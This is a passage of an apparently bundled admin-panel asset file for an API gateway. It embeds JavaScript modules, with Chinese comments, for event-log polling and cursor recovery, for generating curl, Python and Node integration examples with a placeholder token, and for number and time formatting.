用途就是\"把噪音清掉、从此刻起盯着新的\"。把游标一起重置的话，下一轮冷读会立刻\n * 把同一批事件原样拉回来——按钮看上去等于没生效。所以这里修的是**措辞**，\n * 并由 `ev.cleared` 把恢复路径（下载 / 刷新页面）一并说清楚。\n */\nexport function eventsListMessageKey(loadError, viewLength, filteredLength, cleared) {\n  if (loadError && viewLength === 0) return \"common.loadFailed\";\n  if (filteredLength === 0) {\n    if (viewLength > 0) return \"ev.noMatch\";\n    return cleared === true ? \"ev.cleared\" : \"ev.empty\";\n  }\n  return null;\n}\n\n/**\n * 本 isolate 的分片 id（评审 M2）。**没有数据时是 null**，不是空串——\n * 空串会被当成\"有值但恰好是空\"，与\"读不出来\"混在一起。\n */\nexport function shardIdOf(body) {\n  const v = body && typeof body === \"object\" ? body.shardId : null;\n  return typeof v === \"string\" && v !== \"\" ? v : null;\n}\n\n/**\n * 响应生成时刻（后端 `now()`，评审 N1 点名的第二个零消费者字段，[LOW]）。\n *\n * 与 `pure/keys.mjs` 的 `generatedAt` 同一条理由（那边用它当 `cooldownRemaining`\n * 的参照时刻，不用浏览器时钟）：这里没有需要拿它算差值的场景，**最小、低风险的\n * 消费方式**是让轮询指示灯的 tooltip 报一句\"数据截至几点\"——运维只要看这个\n * tooltip 就知道当前显示的是不是刚刚拉到的，不需要另外去猜面板有没有卡住。\n * 缺失/畸形时是 `null`（渲染成不显示这一段，不是显示一个假时间）。\n */\nexport function generatedAtOf(body) {\n  const v = body && typeof body === \"object\" ? body.generatedAt : null;\n  return typeof v === \"number\" && Number.isFinite(v) ? v : null;\n}\n\n/**\n * 响应自述状态。**没有数据时逐项 null**（不是 0/false）——那几个字面上恰好\n * 也是\"一切正常\"的值，混进\"读不出来\"里会把面板变成在撒谎。\n *\n * - `truncated`（评审 I3）：`after`+`limit` 组合截掉了一部分本该出现的旧事件。\n * - `buffered`（评审 N1）：本 isolate 缓冲里还有多少条事件没有落盘。isolate 在\n *   下一次成功 flush 之前被回收（Worker 上是常态）时，这些事件会**永久丢失**，\n *   而 `dropped` 不计它（`dropped` 只统计已经落盘/已经在内存环里明确丢弃的那些，\n *   还\"活在\"缓冲区里、尚未有机会落盘或丢弃的不算）。字段消费者审计发现这是\n *   唯一一个响应里给了但没有任何地方读的字段，这里补上。\n * - `cursorAhead`（评审 C6）：`after` 领先于本次请求的时钟（时钟回拨 / isolate\n *   间时钟偏移），`items` 恒为空但这**不代表没有新事件**，前端必须能区分开。\n * - `malformed`（本任务）：这一次读里被逐条丢掉的畸形条目数。`src/` 里没有任何\n *   路径能产出它，**恒为 0 正是它的价值**——运维手改存储 / KV 值损坏 /\n *   `store.json` 被写到一半时，它是唯一能把「面板少了几条事件」与「本来就没有\n *   事件」区分开的信号。**刻意不进 `shouldWarn`**（见那个函数的说明），\n *   只进轮询指示灯的 tooltip，与 `buffered` 走同一条路。\n */\nexport function bufferStatus(body) {\n  const dropped = body && typeof body === \"object\" ? body.dropped : null;\n  const budgetExhausted = body && typeof body === \"object\" ? body.budgetExhausted : null;\n  const truncated = body && typeof body === \"object\" ? body.truncated : null;\n  const buffered = body && typeof body === \"object\" ? body.buffered : null;\n  const cursorAhead = body && typeof body === \"object\" ? body.cursorAhead : null;\n  const malformed = body && typeof body === \"object\" ? body.malformed : null;\n  return {\n    dropped: typeof dropped === \"number\" && Number.isFinite(dropped) ? dropped : null,\n    budgetExhausted: typeof budgetExhausted === \"boolean\" ? budgetExhausted : null,\n    truncated: typeof truncated === \"boolean\" ? truncated : null,\n    buffered: typeof buffered === \"number\" && Number.isFinite(buffered) ? buffered : null,\n    cursorAhead: typeof cursorAhead === \"boolean\" ? cursorAhead : null,\n    malformed: typeof malformed === \"number\" && Number.isFinite(malformed) ? malformed : null,\n  };\n}\n\n/**\n * 顶部黄条要不要出现。**诚实标记必须由后端字段驱动**（Task 4 评审 I4 的裁定，\n * 在 Task 5 隔了一个任务原样复发过一次）：判据只看 `status.dropped` /\n * `status.budgetExhausted` / `status.truncated` / `status.cursorAhead` 这几个\n * 从响应里取出来的值，不许在这里或调用方硬编码一个 true/false。\n * `null`（没有数据）不触发——不知道不等于\"有问题\"。**不含 `buffered`**：单纯\n * \"缓冲区里还有事件没落盘\"是运行中的正常状态（还没到落盘时机而已），只有搭配\n * \"isolate 可能被回收\"这层风险才值得说，这条风险不是靠一个数字大小能判断的，\n * 交给轮询指示灯的 tooltip 常驻显示（见 `sec-events.js`），不占用黄条。\n *\n * **也不含 `malformed`**（本任务，刻意的）：`src/` 里没有任何路径能产出畸形条目，\n * 它恒为 0，挂上来只会让黄条的判据多一条**永远为假**的分支——那是「形状断言\n * 冒充行为断言」在产品面上的等价物。它与 `buffered` 一样走 tooltip。\n *\n * ⚠️ **但 `cursorBroken` 进来了（评审 I6）**，而且它比在座任何一条都更该在：\n * 它意味着**后端此刻正在违约**——`cursor` 既不是有限数字也不是 `null`，于是游标\n * 推不动、面板可能**永远看不到新事件**。判据里那条 `cursorAhead` 反倒是会自愈的\n * 时钟纠纷。第一版只把它接进 tooltip，**等于把「面板在撒谎」降级成「面板在小声说」**\n * ——而上面「黄条是给『现在有问题』用的」这条推理，恰恰要求它上黄条。\n * 它**不是**恒为假：`src/` 产不出畸形条目，但畸形 `cursor` 的来源是**存储被外部\n * 写坏**，与 `malformed` 同源、也同样是真实可达的。\n */\nexport function shouldWarn(status) {\n  return (status.dropped !== null && status.dropped > 0)\n    || status.budgetExhausted === true\n    || status.truncated === true\n    || status.cursorAhead === true\n    || status.cursorBroken === true;\n}\n\n/**\n * 下一次轮询该带的 `after` 游标，**以及后端契约有没有被破坏**。\n *\n * 三种输入，三种语义，**不许合并成两种**：\n * · `cursor` 是有限数字 ⇒ 推进。\n * · `cursor` 是 `null` ⇒ **本页没有新事件**，保留当前值。不能回退成 null 或某个\n *   旧值——那会让下一次轮询把已经看过的事件重新拉一遍。\n * · `cursor` 是别的（缺字段 / `undefined` / `NaN` / 字符串）⇒ **后端契约被破坏了**，\n *   保留当前值**但把这件事说出去**。\n *\n * 原来第三支与第二支是合并的（`nextAfter` 一个三元表达式），于是「后端在吐畸形\n * 数据」被显示成「一切正常，只是没有新事件」——**面板在撒谎**，而且撒的正是让人\n * 查不下去的那种谎：游标永远推不动，每一轮都是满额 48 次 get 的冷读，稳态读吞吐\n * 276,480 次/天（包线 70,560 的 3.9 倍），面板上却什么异常都看不到。\n */\nexport function cursorOutcome(current, cursor) {\n  if (typeof cursor === \"number\" && Number.isFinite(cursor)) return { after: cursor, broken: false };\n  if (cursor === null) return { after: current, broken: false };\n  return { after: current, broken: true };\n}\n\n/**\n * 下一次轮询该带的 `after` 游标（只要取值那一半）。\n * **判据只有 `cursorOutcome` 一份**，这里不重新实现——同一个判据的第二份实现\n * 正是本仓裁过三次的那一族。\n */\nexport function nextAfter(current, cursor) {\n  return cursorOutcome(current, cursor).after;\n}\n\n/**\n * 轮询的**全部跨轮状态**。三个字段合成一个对象是有意为之，见 `pollOutcome()`\n * 的\"为什么是一个状态对象\"一段。\n *\n * - `after`：下一次请求要带的游标（`null` = 冷读）。\n * - `healing`：正处在一次游标自愈之后、**还没有重新建立起游标**的那一段。\n * - `delayMs`：下一次轮询的退避间隔。\n */\nexport function initialPollState() {\n  return { after: null, healing: false, delayMs: EVENTS_POLL_MIN_MS };\n}\n\n/**\n * 重新进入本板块时的状态。**保留 `after`**（已经看过的事件不该因为切走又切回来\n * 再拉一遍），但把退避与自愈状态归零——这两者描述的是\"最近这一段轮询发生了什么\"，\n * 隔了一段时间之后不再成立。\n *\n * 这条也是决策，不是拼装：写在板块文件里就又是一处没人测的跨轮规则。\n */\nexport function resumePollState(prev) {\n  const state = prev && typeof prev === \"object\" ? prev : {};\n  const after = typeof state.after === \"number\" && Number.isFinite(state.after) ? state.after : null;\n  return { after, healing: false, delayMs: EVENTS_POLL_MIN_MS };\n}\n\n/**\n * 一轮轮询成功之后的**完整状态转换**（评审 C6 二审 / 三审(a) / 四审 B1）。这条\n * 判断原来直接摊在 `sec-events.js` 的 `poll()` 里，是纯状态转换却没有测试覆盖，\n * 两个联带 bug 都是从这个洞里漏出来的——**这不是渲染逻辑，是决策逻辑**，与\n * `admin-ui/README.md` 硬规则 1 管的是同一类东西。\n *\n * **为什么入参/返回值是一个状态对象，而不是把跨轮标记单独传进传出**：三审(a) 的\n * 第一版把 `justHealed` 做成\"第五个入参 + 板块文件在每轮末尾自己用 `resetView`\n * 更新\"，于是\"上一轮的自愈不算这一轮的新内容\"这条**跨轮规则**有一半落在板块文件\n * 里——而板块文件没有任何自动化覆盖。四审实测：把板块文件里那一行改成恒 `false`\n * （并重跑 `scripts/build-ui.mjs`，免得被逐字节漂移门禁冒充抓到），全套 1241 条\n * 用例**一条都不红**，包括当时专门为这条修复新写的那条端到端用例——因为那条用例\n * 用自己的局部变量把这半条规则**又抄了一遍**，测的是抄件不是原件。现在整条规则\n * （置位、清位、保持）都在这个函数里，板块文件只剩一次整体赋值，不再持有判据。\n *\n * 返回：\n * - **`resetView`**：`cursorAhead` 为 `true` 时视图必须跟着游标一起清空，不能只清\n *   游标——`mergeIntoView` 是纯 `[...inc, ...cur]`，不去重；不清视图的话，自愈之后\n *   下一轮冷读回来的是\"最新\"的一批，会跟视图里已经卡在\"未来\"、语义已经不可信的\n *   那一批拼在一起，造成整页重复（无条件，单次自愈就会触发）。\n * - **`hadNewItems`**：退避间隔要不要回到最短，**只能看服务端这次真的返回了几条**\n *   （`items.length > 0`），不能借用\"游标变没变\"当替身——原来的实现正是用\n *   `state.after !== beforeAfter` 当替身，自愈本身也会让游标变化（从非 null 变成\n *   null），于是\"游标被清空\"被误判成\"来了新事件\"，退避永远回不到最长间隔（评审\n *   实测：稳态吞吐从按 C4b 算好的那条包线涨到约两倍）。\n * - **`next`**：下一轮的完整状态，见 `initialPollState()` 的字段说明。\n *   - `after`：`nextAfter()` 叠加\"游标自愈\"——`cursorAhead` 为 `true` 时无条件重置\n *     为 `null`，不管 `cursor`/旧值算出来是什么。冻结在未来的游标不能继续带下去，\n *     下一轮必须变成冷读才能真正恢复。\n *   - `healing`：自愈时置位，**真正重新建立起游标**（`after` 从 `null` 变回一个\n *     数字）时清位，其余保持。见下面一段。\n *   - `delayMs`：`nextPollDelayMs(上一轮的间隔, hadNewItems)`。\n *\n * ⚠️ **`healing` 为什么是\"自愈之后直到重新建立起游标为止\"，不是\"刚好上一轮\"**\n * （评审四审 B2）：三审(a) 那一版写的是\"只遮紧接着的一轮\"，而**冷读状态会持续\n * 很多轮**——落后的那个 isolate 结构上看不见领先 isolate 写进未来窗口的事件，\n * 恒返回 `cursor: null`，`nextAfter()` 就把 `after` 一直留在 `null`。于是此后\n * **每一次**落到领先的 isolate，都会把同一批旧事件当成\"新内容\"，退避塌回 15 秒。\n * 四审逐轮实测（负载均衡每 4 轮才命中一次领先 isolate）：\n *\n *     0 B ahead=0 items=1 jhIn=0 new=1 gets=48 delay=15s   <- 旧事件被当成新内容\n *     1 A ahead=1 items=0 jhIn=0 new=0 gets= 0 delay=30s   <- 自愈\n *     2 A ahead=0 items=0 jhIn=1 new=0 gets=48 delay=60s   <- 旧规则只遮到这一轮\n *     3 A ahead=0 items=0 jhIn=0 new=0 gets=48 delay=60s\n *     4 B ahead=0 items=1 jhIn=0 new=1 gets=48 delay=15s   <- 又塌回去\n *\n * 稳态吞吐随之**只与\"平均多少轮才命中一次领先 isolate\"（记作 k）有关**，与\"修没修\n * 三审(a)\"几乎无关：旧规则下 k=3 / 4 / 6 / 8 实测 78,994 / 75,404 / 72,758 /\n * 71,680 次每天（k=2 的严格交替是唯一的例外，34,560，旧规则恰好也够用），\n * **k≥3 全部超出 C4b 规划、五语言 DEPLOY.md 白纸黑字承诺的包线**。改成\n * \"直到重新建立起游标为止\"之后，退避在整个 k 轮周期里再也不会被塌回最短，稳态\n * 吞吐变成 `69,120 × (k−1) ÷ k + 1,440`：k=2 → 36,000、k=3 → 47,520、\n * k=4 → 53,280、k=6 → 59,040、k=8 → 61,920，**k 再大也只是从下方逼近 70,560，\n * 不会越过**（k→∞ 就是\"没有时钟偏移\"那条基准线本身，恰好等于 70,560）。\n *\n * ⚠️ 上面这一组数与那一行 `+1,440`（全分支评审 C2）：**每一轮轮询自己还会顺带\n * 触发一次配置读**（配置刷新中间件挂在所有路由之前，配置缓存 TTL 30 秒 < 稳态\n * 轮询间隔 60 秒 ⇒ 每轮恰好一次）。上一版的夹具用固定 holder，把这一项整个漏掉，\n * 于是那时写下的 34,560 / 46,080 / 51,840 / 57,600 / 60,480 与包线 69,120\n * **全部偏低 1,440**。\n * 这几个数字由 `tests/contract/events-cursor-heal.test.ts` 的\n * 「轮命中一次领先 isolate：稳态吞吐」那一组逐个钉住（连同 70,560 基准线本身，\n * 同文件的「基准线：没有时钟偏移时稳态就是 70,560 次/天」），不是只写在这里。\n *\n * ⚠️ **这两个指向原来写的是 `:224` / `:269`，两个行号都在本轮漂掉了**——\n * 那个文件只是加了几行注释。**行号会腐烂，名字不会**；两处都改成名字锚。\n *\n * **代价，明写，并且是可证的上界**：`healing` 为真的那一段里 `after` 恒是 `null`\n * （自愈把它清成 null，只有拿到非 `null` 的 `cursor` 才会变回数字），而后端契约是\n * `cursor` 非 `null` **当且仅当** `items` 非空（见 `events.ts` 的\n * `cursor: items.length > 0 ? items[0].ts : null`）。所以\"清位\"这件事发生在\n * **自愈之后第一份非空响应**那一轮上——夹在中间被遮住的那些轮次本来就是空的\n * （`hadNewItems` 不遮也是 `false`）。换句话说：**一次自愈只会让恰好一批 `items`\n * 不把退避顶回 15 秒**，与遮了多少轮无关；这批要么本来就是自愈时刚扔掉的那一批\n * （正是要遮的东西），要么是一批真的新事件——那种情况下代价是它晚一个退避周期\n * （≤60 秒）才被\"盯着看\"的人更快刷新到，事件本身该显示的照常显示，不影响正确性。\n * 这条上界由 `tests/ui/events.test.ts` 的\"保持：自愈之后连续多轮冷读……\"那条用例\n * 直接演示（5 轮空冷读全遮住 → 第一批非空也遮住并清位 → 再下一批正常回到 15 秒）。\n */\nexport function pollOutcome(prev, items, cursor, cursorAhead) {\n  const state = prev && typeof prev === \"object\" ? prev : {};\n  const healed = cursorAhead === true;\n  const currentAfter = typeof state.after === \"number\" && Number.isFinite(state.after) ? state.after : null;\n  const wasHealing = state.healing === true;\n  const outcome = cursorOutcome(currentAfter, cursor);\n  const nextAfterValue = healed ? null : outcome.after;\n  // **`broken` 时不许把 `hadNewItems` 判成真** —— 那正是 W3 那条 276,480 的直接\n  // 成因：游标畸形 ⇒ 每轮都是冷读 ⇒ `items` 恒非空 ⇒ 退避每轮被顶回 15 秒。\n  // 判据放在这里而不是板块文件里：它是跨轮状态转换，不是渲染（硬规则 1）。\n  const hadNewItems = (wasHealing || outcome.broken)\n    ? false\n    : (Array.isArray(items) && items.length > 0);\n  return {\n    resetView: healed,\n    hadNewItems,\n    /** 后端这一轮吐的 `cursor` 不是「数字或 null」——面板必须说出去，不许显示成\"正常\"。 */\n    cursorBroken: outcome.broken,\n    next: {\n      after: nextAfterValue,\n      healing: healed ? true : (nextAfterValue !== null ? false : wasHealing),\n      delayMs: nextPollDelayMs(\n        typeof state.delayMs === \"number\" && Number.isFinite(state.delayMs) ? state.delayMs : EVENTS_POLL_MIN_MS,\n        hadNewItems,\n      ),\n    },\n  };\n}\n\n/**\n * 指数退避的下一个轮询间隔。**有新内容 ⇒ 立刻回到最短间隔**（运维正在盯着，\n * 让它尽快看见后续变化）；**没有新内容 ⇒ 翻倍，封顶到 `EVENTS_POLL_MAX_MS`**。\n */\nexport function nextPollDelayMs(currentDelayMs, hadNewItems) {\n  if (hadNewItems) return EVENTS_POLL_MIN_MS;\n  const doubled = currentDelayMs * 2;\n  return doubled > EVENTS_POLL_MAX_MS ? EVENTS_POLL_MAX_MS : doubled;\n}\n\n/** 轮询状态指示灯该显示哪个状态。三态：暂停 / 出错 / 正常，暂停优先于出错。 */\nexport function pollIndicatorState(state) {\n  if (state.paused) return \"paused\";\n  if (state.lastError) return \"error\";\n  return \"active\";\n}\n\n/** 轮询状态 → i18n key。三条各写一次字面量，好让 i18n 门禁扫得到（同 levelLabelKey）。 */\nexport function pollIndicatorLabelKey(kind) {\n  if (kind === \"paused\") return \"ev.pollStatus.paused\";\n  if (kind === \"error\") return \"ev.pollStatus.error\";\n  return \"ev.pollStatus.active\";\n}\n\n/**\n * 搜索框的过滤判据。匹配 `event` / `msg` / `corr` / 字段值（不区分大小写的子串匹配）。\n * `q` 为空串时一律匹配（不筛）。\n */\nexport function matchesSearch(item, q) {\n  const needle = typeof q === \"string\" ? q.trim().toLowerCase() : \"\";\n  if (needle === \"\") return true;\n  if (!item || typeof item !== \"object\") return false;\n  const haystack = [\n    typeof item.event === \"string\" ? item.event : \"\",\n    typeof item.msg === \"string\" ? item.msg : \"\",\n    typeof item.corr === \"string\" ? item.corr : \"\",\n    item.fields && typeof item.fields === \"object\" ? JSON.stringify(item.fields) : \"\",\n  ].join(\" \").toLowerCase();\n  return haystack.includes(needle);\n}\n\n/**\n * `fields` 对象格式化成一行文本，供渲染时整体塞进一个 `textContent`。\n * **值一律不可信**（可能是攻击者能控制的内容），但这里只做展示格式化，\n * 不做转义/截断——由调用方统一走 `textContent`，不解析成 HTML。\n */\nexport function formatFields(fields) {\n  if (!fields || typeof fields !== \"object\") return \"\";\n  return Object.entries(fields).map(([k, v]) => `${k}=${v === null ? \"null\" : String(v)}`).join(\" \");\n}\n\n/**\n * 一条事件\"说明 / 字段\"列要显示的文本（评审 I4：原来这是 `sec-events.js` 里的\n * 纯取值函数，零测试覆盖，搬进来）。`msg` 与格式化后的 `fields` 用 `·` 连接，\n * 缺一段就不留多余的分隔符。\n */\nexport function buildDetailText(item) {\n  const msg = item && typeof item === \"object\" && typeof item.msg === \"string\" ? item.msg : \"\";\n  const fields = item && typeof item === \"object\" && item.fields && typeof item.fields === \"object\"\n    ? formatFields(item.fields) : \"\";\n  return [msg, fields].filter((s) => s !== \"\").join(\" · \");\n}\n\n/**\n * 按 `corr` 相邻折叠成时间线。**只折叠相邻的**（不是全局按 corr 分组）——\n * 与设计意图一致：同一次操作打出的几条事件在时间上天然挨在一起，\n * 隔着别的事件的两条同名 corr 更可能是巧合，不该被强行拼进同一条时间线。\n *\n * 本期几乎没有事件带 `corr`（P3c 才串进注册机），**无 corr 的每条都是独立的单条组**\n * ——这条函数在\"一个 corr 都没有\"时必须一样能正确工作\n * （见 `tests/ui/events.test.ts` 的「groupEvents：按 corr 相邻折叠」那一组）。\n */\nexport function groupEvents(items) {\n  if (!Array.isArray(items)) return [];\n  const groups = [];\n  for (const item of items) {\n    const corr = item && typeof item === \"object\" && typeof item.corr === \"string\" && item.corr !== \"\"\n      ? item.corr : null;\n    const last = groups[groups.length - 1];\n    if (corr !== null && last && last.corr === corr) {\n      last.items.push(item);\n    } else {\n      groups.push({ corr, items: [item] });\n    }\n  }\n  return groups;\n}\n\n/** 后端给的是 ts 降序（最新在前）；面板要\"自动滚动\"到最新，按时间正序（旧→新）展示。 */\nexport function orderForDisplay(items) {\n  return Array.isArray(items) ? [...items].reverse() : [];\n}\n\n/**\n * 把新拉到的一批（ts 降序，且全部比 `existing` 里任何一条都新——由 `after` 游标保证）\n * 并入客户端已经攒下的视图。**新的在前**，保持整体仍是 ts 降序，与后端契约一致，\n * 只在渲染前的最后一步（`orderForDisplay`）才反转成正序。\n */\nexport function mergeIntoView(existing, incoming) {\n  const inc = Array.isArray(incoming) ? incoming : [];\n  const cur = Array.isArray(existing) ? existing : [];\n  return [...inc, ...cur];\n}\n", type: "text/javascript; charset=utf-8", etag: "\"f48ea09a7144c3cf\"" },
  "/admin/js/pure/examples.mjs": { body: "/**\n * 集成示例：**四协议 × 三语言 = 12 段**（设计 §10.4 第 4 张卡）。\n *\n * ⚠️ **本模块不知道任何端点路径。** 路径、请求方法、鉴权头的名字、最小请求体\n * 全部来自 `GET /admin/api/models` 的响应（真源 `src/core/admin/protocol-catalog.ts`）。\n * 这是设计文档订正 D1 的落点：集成示例卡与 Playground 是同一份知识，\n * 「做两遍必漂，而漂了没人会发现」。\n *\n * ── **本模块自己知道的那三小件，逐条登记（别让它们悄悄长大）** ────────────────\n * ① **`{model}` 这个占位符本身**。`pathTemplate` 交过来的是模板，展开它就必须认识\n *    那个 token；真源里 `endpointFor()` 做的是同一件事。**这是第二份知识，如实登记**，\n *    并且它被钉住了：`tests/ui/examples.test.ts` 的\n *    「真实目录跑出来的 12 段里，没有一段还留着未展开的模型占位符」\n *    ——真源哪天换了占位符写法，那一格当场红。\n * ② **`authorization` 这个头要带 `Bearer ` 前缀**。这条不在目录里、也不该在目录里\n *    （它是 HTTP 的惯例，不是这个网关的知识），网关那一侧解析它的是\n *    `src/http/middleware/auth.ts` 里那条 bearer 正则。**头的名字仍然来自目录**，\n *    本模块只决定值要不要加前缀。\n * ③ **三种客户端语言的代码骨架**（curl / Python / Node）。它们是语言，不是端点。\n *\n * ⚠️ **`origin` 是参数不是全局**：这个目录下禁止出现浏览器的那两个顶层全局\n *（`scripts/build-ui.mjs` 里 `js/pure/` 的三条静态校验，违反即 exit 1，含注释里的字样）。\n * 调用方 `admin-ui/js/sec-settings.js` 读一次再传进来。\n *\n * ⚠️ **key 恒是 `KEY_PLACEHOLDER` 占位**：面板拿不到明文网关口令\n *（设计 §8.6「凭据只写不读」，`GET /admin/api/config` 对它只回 configured 与 hint 两格），\n * 所以「一键填入我的口令」这个选项在这里根本不存在。\n *\n * ⚠️ **本文件里一个 URL 字面量都没有**（连 scheme 都没有）：base URL 写死任何一个\n * 都是错的。由 `tests/ui/examples.test.ts` 的\n * 「本模块源码里一个 URL 字面量都没有 —— base URL 只能从运行期的 origin 来」扫着。\n */\n\n/** 三种客户端语言。**顺序即渲染顺序。** */\nexport const EXAMPLE_LANGS = [\"curl\", \"python\", \"node\"];\n\n/** 示例里那把 key 的占位符。**面板永远填不进真值，也不该填得进。** */\nexport const KEY_PLACEHOLDER = \"YOUR_GATEWAY_TOKEN\";\n\n/** 普通对象，否则 `null`。数组不算。 */\nfunction obj(v) {\n  return typeof v === \"object\" && v !== null && !Array.isArray(v) ? v : null;\n}\n\n/**\n * 响应里那份协议清单，窄化成集成示例卡用得上的那几格。\n * **读不出来时是 `null`，不是空数组**——「这个网关一条协议都没有」与「这份响应读不出来」\n * 是两句话，而一张空的示例卡在屏幕上跟后者长得一模一样（全局约束 9 的同型）。\n *\n * ⚠️ **任何一条格式不对就整份判成读不出来**，不是把坏的那条跳过：跳过之后卡上会少一个\n * 协议标签页而**看起来完全正常**，后果是把一条真的能用的协议入口从文档里抹掉。\n *\n * ⚠️ **它与 `admin-ui/js/pure/models.mjs` 的 `catalogProtocols()` 是同一份响应的两个视图，\n * 不是两份知识**：那边只要 id 与展示名（画徽章用），这边还要方法、路径模板、鉴权头与\n * 请求体（拼代码用）。把两者并成一个函数的代价是模型板块从此要求响应里有 `sampleBody`\n * ——一份它根本不看的字段缺了就整张表读不出来。\n * ⚠️ **同一份响应的模型清单这边不再窄化一遍**：调用方直接复用 `models.mjs` 的\n * `catalogModels()`，本模块只接它交出来的结果。\n */\nexport function exampleProtocols(payload) {\n  const p = obj(payload);\n  if (p === null || !Array.isArray(p.protocols)) return null;\n  const out = [];\n  for (const item of p.protocols) {\n    const e = obj(item);\n    if (e === null) return null;\n    if (typeof e.id !== \"string\" || typeof e.label !== \"string\") return null;\n    if (typeof e.method !== \"string\" || e.method === \"\") return null;\n    if (typeof e.pathTemplate !== \"string\" || e.pathTemplate === \"\") return null;\n    if (typeof e.authHeader !== \"string\" || e.authHeader === \"\") return null;\n    if (obj(e.sampleBody) === null) return null;\n    out.push({\n      id: e.id,\n      label: e.label,\n      method: e.method,\n      pathTemplate: e.pathTemplate,\n      authHeader: e.authHeader,\n      sampleBody: e.sampleBody,\n    });\n  }\n  return out;\n}\n\n/**\n * 这条协议的示例该用哪个模型：**清单里第一个真的支持这条协议的**，没有就是 `null`。\n *\n * ⚠️ **不是「清单里的第一个」**：媒体模型的 `protocols` 是空数组，拿它去拼一条对话协议的\n * 路径会教出一条打不通的 URL。\n * ⚠️ **也不是全卡共用一个模型**：只有把模型拼进路径的那条协议需要它，而「这个模型支持\n * 这条协议吗」这个问题只有逐协议问才有正确答案。\n */\nexport function modelForProtocol(protocol, models) {\n  if (!Array.isArray(models)) return null;\n  for (const m of models) {\n    const e = obj(m);\n    if (e === null || typeof e.id !== \"string\") continue;\n    if (Array.isArray(e.protocols) && e.protocols.includes(protocol.id)) return e.id;\n  }\n  return null;\n}\n\n/**\n * 这一条协议要发的头。**头的名字一律来自目录**，本模块只决定值要不要带 `Bearer ` 前缀\n *（见文件头登记的第 ② 件）。`content-type` 是 HTTP，不是这个网关的知识。\n */\nfunction headerLines(proto) {\n  const value = proto.authHeader === \"authorization\" ? `Bearer ${KEY_PLACEHOLDER}` : KEY_PLACEHOLDER;\n  return [[proto.authHeader, value], [\"content-type\", \"application/json\"]];\n}\n\n/**\n * 一段代码。`lang` 必须是 `EXAMPLE_LANGS` 里的一档——三个分支对那三档是穷尽的，\n * 而 `allExamples()` 只按 `EXAMPLE_LANGS` 迭代。\n *\n * `model` 只在 `pathTemplate` 里带着占位符时才用得上（四条里只有一条这样）。\n */\nexport function exampleFor(proto, origin, lang, model) {\n  const path = String(proto.pathTemplate).replace(\"{model}\", String(model));\n  const url = `${origin}${path}`;\n  const method = String(proto.method);\n  const body = JSON.stringify(proto.sampleBody, null, 2);\n  const headers = headerLines(proto);\n  if (lang === \"curl\") {\n    const h = headers.map(([k, v]) => ` \\\\\\n  -H '${k}: ${v}'`).join(\"\");\n    return `curl -X ${method} '${url}'${h} \\\\\\n  -d '${body}'`;\n  }\n  if (lang === \"python\") {\n    const h = headers.map(([k, v]) => `        \"${k}\": \"${v}\",`).join(\"\\n\");\n    return `import requests\\n\\nr = requests.request(\\n    \"${method}\",\\n    \"${url}\",\\n    headers={\\n${h}\\n    },\\n    json=${body},\\n)\\nprint(r.json())`;\n  }\n  const h = headers.map(([k, v]) => `    \"${k}\": \"${v}\",`).join(\"\\n\");\n  return `const r = await fetch(\"${url}\", {\\n  method: \"${method}\",\\n  headers: {\\n${h}\\n  },\\n  body: JSON.stringify(${body}),\\n});\\nconsole.log(await r.json());`;\n}\n\n/**\n * 12 段。**协议顺序照真源给的顺序，不在这里重排**——重排就是又一份知识。\n *\n * ⚠️ **`code` 为 `null` 是一档真状态，不是失败**：这条协议的路径需要一个模型，\n * 而清单里没有任何模型支持它。这时候**绝不能把 `null` 拼进 URL 交出去**——\n * 那是一条长得像真的、按着抄一定打不通的地址。调用方按「这一档没有示例」画。\n */\nexport function allExamples(protocols, models, origin) {\n  const out = [];\n  for (const p of protocols) {\n    const model = modelForProtocol(p, models);\n    const needsModel = String(p.pathTemplate).includes(\"{model}\");\n    for (const lang of EXAMPLE_LANGS) {\n      out.push({\n        protocol: p.id,\n        label: p.label,\n        lang,\n        model,\n        code: needsModel && model === null ? null : exampleFor(p, origin, lang, model),\n      });\n    }\n  }\n  return out;\n}\n\n/**\n * 语言那一档的展示名。**专名，刻意不进 i18n**——理由与协议的 `label` 一样\n *（见 `src/core/admin/protocol-catalog.ts` 里 `label` 字段上方那一行）：\n * 翻译一个专名只会制造歧义。\n * **表外的值返回 `null`，调用方把原值照实画出来**，不冒充任何一档已知语言。\n */\nexport function langLabel(lang) {\n  if (lang === \"curl\") return \"cURL\";\n  if (lang === \"python\") return \"Python\";\n  if (lang === \"node\") return \"Node.js\";\n  return null;\n}\n", type: "text/javascript; charset=utf-8", etag: "\"b167045a738335f0\"" },
  "/admin/js/pure/format.mjs": { body: "/**\n * 面板的格式化。**全部纯函数**：无副作用、不读环境、时间与时区都从参数进。\n *\n * 时区必须从参数进，不许读运行环境的本地时区：Worker 上是 UTC、用户浏览器里是本地时区，\n * 同一份数据两种显示就是面板在撒谎。面板统一按「用户浏览器时区」渲染并**标注偏移**，\n * 偏移量由调用方算好传进来。\n *\n * 这个目录下的文件受三条硬规则约束，规则全文见 admin-ui/README.md。\n */\n\n/** 没有值就是没有值。**绝不伪造 0**——接口失败显示 0 会让运维以为「真的是零」。 */\nexport function fmtDash(v) {\n  if (v === null || v === undefined) return \"—\";\n  if (typeof v === \"number\" && !Number.isFinite(v)) return \"—\";\n  return String(v);\n}\n\n/** 千分位。**刻意不做 1.2k 这种有损缩写**：运维要的是准确数字。 */\nexport function fmtCount(v) {\n  if (v === null || v === undefined || typeof v !== \"number\" || !Number.isFinite(v)) return \"—\";\n  const neg = v < 0;\n  const s = String(Math.trunc(Math.abs(v))).replace(/\\B(?=(\\d{3})+(?!\\d))/g, \",\");\n  return neg ? `-${s}` : s;\n}\n\n/**\n * 百分比，一位小数。\n * **分母为 0 时返回 —，不是 0.0%**：「一次都没跑过」与「成功率 0%」是两回事，\n * 后者会让运维去查一把其实从没被用过的 key。\n */\nexport function fmtPercent(num, den) {\n  if (typeof num !== \"number\" || typeof den !== \"number\") return \"—\";\n  if (!Number.isFinite(num) || !Number.isFinite(den) || den <= 0) return \"—\";\n  return `${((num / den) * 100).toFixed(1)}%`;\n}\n\n/**\n * 时长。负数（时钟回拨、冷却已到期）一律按 0 渲染——显示「-3秒」只会让人以为读错了。\n * 只到两档精度：再细的位数在运维场景里没有信息量，只会让列宽跳动。\n */\nexport function fmtDuration(ms) {\n  if (ms === null || ms === undefined || typeof ms !== \"number\" || !Number.isFinite(ms)) return \"—\";\n  const t = Math.max(0, Math.trunc(ms));\n  const s = Math.trunc(t / 1000);\n  if (s < 60) return `${s}秒`;\n  const m = Math.trunc(s / 60);\n  if (m < 60) return `${m}分${s % 60}秒`;\n  const h = 